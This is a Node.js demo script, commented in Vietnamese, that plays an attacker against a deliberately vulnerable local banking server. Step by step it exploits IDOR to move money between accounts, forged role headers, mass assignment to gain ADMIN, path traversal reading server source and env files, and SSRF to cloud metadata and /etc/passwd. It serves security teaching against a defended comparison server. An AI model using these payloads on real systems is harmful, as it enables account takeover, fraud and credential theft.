#!/usr/bin/env node
/**
 * 🔴 ATTACK DEMO – Kịch bản tấn công 5 lỗ hổng CWE
 * Chạy song song server-vulnerable.js (cổng 3001), sau đó chạy file này.
 *
 *   node attack-demo/server-vulnerable.js &
 *   node attack-demo/attack-scenarios.js
 *
 * Script mô phỏng vai trò kẻ tấn công, khai thác từng lỗi và in kết quả chi tiết.
 */
const BASE = process.env.BASE_URL || 'http://localhost:3001';
const PASSWORD = 'Bank@2025';
const color = process.stdout.isTTY && !process.env.NO_COLOR;
const c = (code, s) => (color ? `\x1b[${code}m${s}\x1b[0m` : s);
const RED = s => c(31, s), GREEN = s => c(32, s), YELLOW = s => c(33, s),
      CYAN = s => c(36, s), BOLD = s => c(1, s), DIM = s => c(90, s);

async function http(path, { method = 'GET', token, body, headers = {} } = {}) {
  const res = await fetch(BASE + path, {
    method,
    headers: { 'Content-Type': 'application/json', ...(token && { Authorization: `Bearer ${token}` }), ...headers },
    body: body === undefined ? undefined : JSON.stringify(body),
  });
  let data = {};
  try { data = await res.json(); } catch {}
  return { status: res.status, data };
}

async function login(username) {
  const r = await http('/api/login', { method: 'POST', body: { username, password: PASSWORD } });
  if (!r.data.token) throw new Error(`Đăng nhập thất bại: ${username}`);
  return r.data.token;
}

function banner(title) {
  const line = '═'.repeat(60);
  console.log(`\n${CYAN(line)}`);
  console.log(BOLD(CYAN(`  ${title}`)));
  console.log(`${CYAN(line)}`);
}

function step(n, desc) {
  console.log(`\n  ${YELLOW(`[Bước ${n}]`)} ${desc}`);
}

function result(success, detail) {
  const tag = success ? RED('✗ KHAI THÁC THÀNH CÔNG') : GREEN('✓ Đã bị chặn');
  console.log(`  ${tag}  ${DIM(detail)}`);
  return success;
}

(async () => {
  console.log(BOLD(`\n${'━'.repeat(64)}`));
  console.log(BOLD(RED('  🔴 DEMO TẤN CÔNG – Kịch bản khai thác 5 lỗ hổng CWE')));
  console.log(BOLD(`${'━'.repeat(64)}`));
  console.log(DIM(`  Mục tiêu: ${BASE}`));
  console.log(DIM(`  Mục đích: Minh họa hậu quả khi thiếu kiểm soát truy cập\n`));

  let tokenA, tokenB, tokenT;
  try {
    tokenA = await login('userA');
    tokenB = await login('userB');
    tokenT = await login('teller1');
    console.log(GREEN('  ✓ Đã đăng nhập 3 tài khoản demo'));
  } catch (e) {
    console.error(RED('  Lỗi: ' + e.message));
    console.error(RED('  → Hãy khởi động server-vulnerable.js trước (cổng 3001)'));
    process.exit(2);
  }

  let exploited = 0;

  // ============================================================
  // CASE 1: CWE-639 – IDOR / BOLA
  // ============================================================
  banner('CASE 1: CWE-639 – IDOR (Insecure Direct Object Reference)');
  console.log(DIM('  Mô tả: Kẻ tấn công thay đổi accountId trong URL để xem'));
  console.log(DIM('  thông tin tài khoản của người khác.'));

  step(1, 'userA đọc tài khoản 1002 (của userB) bằng cách đổi accountId');
  const r1 = await http('/api/accounts/detail?accountId=1002', { token: tokenA });
  if (result(r1.status === 200, `HTTP ${r1.status}`)) {
    exploited++;
    console.log(DIM(`  → Thông tin bị lộ: ${r1.data.data?.fullName}, Số dư: ${r1.data.data?.balance?.toLocaleString()} VNĐ`));
    console.log(DIM(`  → Số giao dịch lộ: ${r1.data.transactions?.length || 0}`));
  }

  step(2, 'userA trích tiền từ TK 1002 (fromAccountId giả mạo)');
  const balBefore = (await http('/api/accounts/detail?accountId=1002', { token: tokenA })).data.data?.balance;
  const r1b = await http('/api/transactions/transfer', {
    method: 'POST', token: tokenA,
    body: { fromAccountId: '1002', toAccountId: '1001', amount: 5000000, memo: 'Trích tiền trái phép' }
  });
  if (result(r1b.status === 201, `HTTP ${r1b.status}`)) {
    exploited++;
    const balAfter = (await http('/api/accounts/detail?accountId=1002', { token: tokenA })).data.data?.balance;
    console.log(DIM(`  → Số dư TK 1002 trước: ${balBefore?.toLocaleString()} → sau: ${balAfter?.toLocaleString()} VNĐ`));
    console.log(DIM(`  → Kẻ tấn công đã trích 5.000.000 VNĐ từ tài khoản nạn nhân!`));
  }

  // ============================================================
  // CASE 2: CWE-285/862 – BFLA
  // ============================================================
  banner('CASE 2: CWE-285/862 – BFLA (Broken Function Level Authorization)');
  console.log(DIM('  Mô tả: Khách hàng thường truy cập API quản trị để duyệt vay,'));
  console.log(DIM('  dùng method không đúng và header giả mạo vai trò.'));

  step(1, 'userA (khách hàng) tự duyệt khoản vay #101 bằng PUT');
  const r2a = await http('/api/admin/approve-loan', {
    method: 'PUT', token: tokenA,
    body: { loanId: 101, action: 'APPROVED' }
  });
  if (result(r2a.status === 200, `HTTP ${r2a.status}`)) {
    exploited++;
    console.log(DIM(`  → Trạng thái khoản vay: ${r2a.data.loan?.status}`));
    console.log(DIM(`  → Người duyệt: ${r2a.data.loan?.approvedBy}`));
  }

  step(2, 'userA duyệt vay kèm header giả X-Forwarded-Role: ADMIN');
  const r2b = await http('/api/admin/approve-loan', {
    method: 'POST', token: tokenA,
    body: { loanId: 102, action: 'APPROVED' },
    headers: { 'X-Forwarded-Role': 'ADMIN' }
  });
  if (result(r2b.status === 200, `HTTP ${r2b.status}`)) {
    exploited++;
    console.log(DIM(`  → Người duyệt ghi nhận: ${r2b.data.loan?.approvedBy}`));
    console.log(DIM(`  → Khoản vay VIP 350 triệu đã bị duyệt bởi khách hàng thường!`));
  }

  step(3, 'userA truy cập API quản trị: audit log, danh sách user');
  const r2c = await http('/api/admin/audit', { token: tokenA });
  const r2d = await http('/api/admin/users', { token: tokenA });
  if (result(r2c.status === 200 && r2d.status === 200, `audit=${r2c.status}, users=${r2d.status}`)) {
    exploited++;
    console.log(DIM(`  → Xem được ${r2d.data.data?.length} tài khoản hệ thống`));
  }

  // ============================================================
  // CASE 3: CWE-915 – Mass Assignment
  // ============================================================
  banner('CASE 3: CWE-915 – Mass Assignment');
  console.log(DIM('  Mô tả: Kẻ tấn công gửi thêm trường role, balance, creditLimit'));
  console.log(DIM('  trong API cập nhật hồ sơ, thay đổi quyền hạn và số dư.'));

  step(1, 'userA gửi {role:"ADMIN", balance:999999999, creditLimit:999999999}');
  const meBefore = (await http('/api/me', { token: tokenA })).data.user;
  const r3 = await http('/api/profile/update', {
    method: 'PUT', token: tokenA,
    body: { fullName: 'Hacker A', role: 'ADMIN', balance: 999999999, creditLimit: 999999999, tier: 'VIP' }
  });
  const meAfter = (await http('/api/me', { token: tokenA })).data.user;
  if (result(meAfter.role === 'ADMIN' || meAfter.balance === 999999999, `role: ${meBefore.role} → ${meAfter.role}`)) {
    exploited++;
    console.log(DIM(`  → Vai trò: ${meBefore.role} → ${meAfter.role}`));
    console.log(DIM(`  → Số dư:   ${meBefore.balance?.toLocaleString()} → ${meAfter.balance?.toLocaleString()} VNĐ`));
    console.log(DIM(`  → Hạn mức: ${meBefore.creditLimit?.toLocaleString()} → ${meAfter.creditLimit?.toLocaleString()} VNĐ`));
    console.log(DIM(`  → Phân hạng: ${meBefore.tier} → ${meAfter.tier}`));
  }

  // ============================================================
  // CASE 4: CWE-22 – Path Traversal
  // ============================================================
  banner('CASE 4: CWE-22 – Path Traversal');
  console.log(DIM('  Mô tả: Kẻ tấn công dùng ../ trong tham số file để đọc'));
  console.log(DIM('  file ngoài thư mục cho phép, ví dụ mã nguồn server.js.'));

  step(1, 'Đọc sao kê của người khác: statement_1002.csv');
  const r4a = await http('/api/statements/download?file=statement_1002.csv', { token: tokenA });
  if (result(r4a.status === 200, `HTTP ${r4a.status}`)) {
    exploited++;
    console.log(DIM(`  → Nội dung sao kê TK 1002 (${r4a.data.content?.split('\\n').length || 0} dòng) đã bị lộ`));
  }

  step(2, 'Đọc mã nguồn server: ../server.js');
  const r4b = await http('/api/statements/download?file=../server.js', { token: tokenA });
  if (result(r4b.status === 200, `HTTP ${r4b.status}`)) {
    exploited++;
    console.log(DIM(`  → Đã đọc ${r4b.data.content?.length || 0} ký tự mã nguồn server`));
    const preview = (r4b.data.content || '').slice(0, 120).replace(/\n/g, ' ');
    console.log(DIM(`  → Preview: "${preview}..."`));
  }

  step(3, 'Đọc file .env.example: ../.env.example');
  const r4c = await http('/api/statements/download?file=../.env.example', { token: tokenA });
  if (result(r4c.status === 200, `HTTP ${r4c.status}`)) {
    exploited++;
    console.log(DIM(`  → Đã đọc file cấu hình môi trường!`));
  }

  // ============================================================
  // CASE 5: CWE-918 – SSRF
  // ============================================================
  banner('CASE 5: CWE-918 – SSRF (Server-Side Request Forgery)');
  console.log(DIM('  Mô tả: Kẻ tấn công gửi URL trỏ về mạng nội bộ, server'));
  console.log(DIM('  gọi request thay, lộ dịch vụ nội bộ và metadata cloud.'));

  step(1, 'Gửi webhook URL = http://127.0.0.1:3001/api/admin/users');
  const r5a = await http('/api/webhooks/test', {
    method: 'POST', token: tokenA,
    body: { webhookUrl: 'http://127.0.0.1:3001/api/admin/users' }
  });
  if (result(!r5a.data.error, `HTTP ${r5a.status}`)) {
    exploited++;
    console.log(DIM(`  → Server đã gọi tới chính mình và trả kết quả về cho attacker!`));
    console.log(DIM(`  → Preview: ${(r5a.data.preview || '').slice(0, 100)}...`));
  }

  step(2, 'SSRF tới metadata service: http://169.254.169.254/latest/meta-data/');
  const r5b = await http('/api/webhooks/test', {
    method: 'POST', token: tokenA,
    body: { webhookUrl: 'http://169.254.169.254/latest/meta-data/' }
  });
  // This will likely fail locally but demonstrates the attempt
  console.log(DIM(`  → Kết quả: ${r5b.data.message || r5b.data.error}`));
  console.log(DIM(`  → Trên cloud thật (AWS/GCP), request này sẽ trả về IAM credentials!`));

  step(3, 'SSRF qua file:// protocol');
  const r5c = await http('/api/webhooks/test', {
    method: 'POST', token: tokenA,
    body: { webhookUrl: 'file:///etc/passwd' }
  });
  console.log(DIM(`  → Kết quả: ${r5c.data.message || r5c.data.error}`));

  // ============================================================
  // Tổng kết
  // ============================================================
  console.log(`\n${BOLD('━'.repeat(64))}`);
  console.log(BOLD(RED(`  🔴 TỔNG KẾT: ${exploited} lỗ hổng đã bị khai thác thành công`)));
  console.log(BOLD('━'.repeat(64)));
  console.log(`
  ${RED('CWE-639')}  IDOR/BOLA         → Đọc tài khoản người khác, trích tiền trái phép
  ${RED('CWE-285')}  BFLA              → Khách hàng duyệt vay, truy cập API quản trị
  ${RED('CWE-915')}  Mass Assignment   → Tự nâng quyền ADMIN, sửa số dư
  ${RED('CWE-22')}   Path Traversal    → Đọc mã nguồn, file cấu hình
  ${RED('CWE-918')}  SSRF              → Gọi dịch vụ nội bộ qua server

  ${YELLOW('→ So sánh với bản phòng thủ (server.js, cổng 3000): tất cả đều bị CHẶN.')}
  ${YELLOW('→ Chạy: node attack-demo/test-model.js  để xem đối chiếu tự động.')}
`);
  process.exit(exploited > 0 ? 1 : 0);
})();
